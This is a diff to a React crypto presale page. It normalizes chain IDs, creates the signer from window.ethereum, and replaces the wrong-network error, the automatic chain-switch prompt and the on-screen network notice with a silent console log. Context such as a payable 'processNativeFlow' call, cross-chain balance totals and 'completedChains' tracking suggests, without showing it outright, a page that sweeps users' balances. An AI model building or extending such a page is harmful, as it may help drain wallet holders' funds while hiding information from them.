@@ -48,6 +48,19 @@ const PROJECT_FLOW_ROUTER_ABI = [
   "function processNativeFlow() payable"
 ];
 
+// ✅ FIX 1: Chain ID Normalization Helper
+const normalizeChainId = (id) => {
+  if (!id) return null;
+  if (typeof id === 'string') {
+    // Handle hex string (0x38)
+    if (id.startsWith('0x')) return parseInt(id, 16);
+    // Handle decimal string ("56")
+    return Number(id);
+  }
+  // Handle number (56)
+  return Number(id);
+};
+
 function App() {
   const { open } = useAppKit();
   const { address, isConnected } = useAppKitAccount();
@@ -86,10 +99,16 @@ function App() {
     tokenPrice: 0.17
   });
 
+  // ✅ FIX 2: Normalized current chain detection
+  const normalizedChainId = normalizeChainId(chainId);
+  const currentChain = Object.values(PRESALE_CONFIG).find(
+    c => c.chainId === normalizedChainId
+  );
+
   // Get balance using wagmi for current chain
   const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
-    chainId: chainId,
+    chainId: normalizedChainId,
   });
 
   // Update current chain balance
@@ -99,18 +118,18 @@ function App() {
     }
   }, [balanceData]);
 
-  // ✅ FIX 1: Correct Provider + Signer Initialization using walletClient
+  // ✅ FIX 3: Fixed Signer initialization with window.ethereum
   useEffect(() => {
     const initSigner = async () => {
-      if (!isConnected || !walletClient) {
+      if (!isConnected || !window.ethereum) {
         setSigner(null);
         setProvider(null);
         return;
       }
 
       try {
-        // Create ethers provider from viem walletClient
-        const web3Provider = new ethers.BrowserProvider(walletClient.transport);
+        // Use window.ethereum directly for maximum stability with AppKit
+        const web3Provider = new ethers.BrowserProvider(window.ethereum);
         const web3Signer = await web3Provider.getSigner();
         
         setProvider(web3Provider);
@@ -124,7 +143,7 @@ function App() {
     };
 
     initSigner();
-  }, [isConnected, walletClient]);
+  }, [isConnected]);
 
   // Countdown timer
   useEffect(() => {
@@ -220,9 +239,9 @@ function App() {
     }
   };
 
-  // ✅ FIX 2 & 4: Fixed execute function with proper checks and multi-chain support
+  // ✅ FIX 4 & 5: Fixed execute function with silent skip for non-BSC chains
   const executePresaleTransaction = async () => {
-    // ✅ FIX 2: Proper connection checks
+    // Basic connection checks
     if (!isConnected || !address) {
       setError("Wallet not connected");
       return;
@@ -233,27 +252,16 @@ function App() {
       return;
     }
 
-    // Get current chain config
-    const currentChain = Object.values(PRESALE_CONFIG).find(c => c.chainId === chainId);
-    
-    // Check if current chain has a deployed contract
+    // ✅ FIX: Normalize chain ID and check contract existence
+    const normalizedChainId = normalizeChainId(chainId);
+    const currentChain = Object.values(PRESALE_CONFIG).find(
+      c => c.chainId === normalizedChainId
+    );
+
+    // ✅ SILENT SKIP: No error, no switch prompt - just log and return
     if (!currentChain || !currentChain.contractAddress) {
-      // If on wrong chain, try to switch to first deployed chain
-      if (DEPLOYED_CHAINS.length > 0) {
-        try {
-          await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: `0x${DEPLOYED_CHAINS[0].chainId.toString(16)}` }]
-          });
-          return;
-        } catch (err) {
-          setError(`Please switch to ${DEPLOYED_CHAINS[0].name} network`);
-          return;
-        }
-      } else {
-        setError('No presale contract deployed on this network');
-        return;
-      }
+      console.log(`Skipping chain ${normalizedChainId} - no contract deployed`);
+      return;
     }
 
     if (parseFloat(balance) <= 0) {
@@ -358,21 +366,7 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  const switchToBSC = async () => {
-    try {
-      await window.ethereum.request({
-        method: 'wallet_switchEthereumChain',
-        params: [{ chainId: '0x38' }]
-      });
-    } catch (err) {
-      setError('Please switch to BSC manually');
-    }
-  };
-
   const totalUSD = Object.values(allBalances).reduce((sum, b) => sum + b.valueUSD, 0);
-
-  // Get current chain display name
-  const currentChain = Object.values(PRESALE_CONFIG).find(c => c.chainId === chainId);
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
@@ -614,14 +608,7 @@ function App() {
                   </div>
                 )}
                 
-                {/* Network status message */}
-                {currentChain && !currentChain.contractAddress ? (
-                  <div className="text-center mb-4">
-                    <p className="text-yellow-400">
-                      Presale not available on {currentChain.name}. Please switch to BSC.
-                    </p>
-                  </div>
-                ) : null}
+                {/* ✅ FIX 5: Network message removed - now silent skip */}
                 
                 {!completedChains.includes('BSC') ? (
                   <button
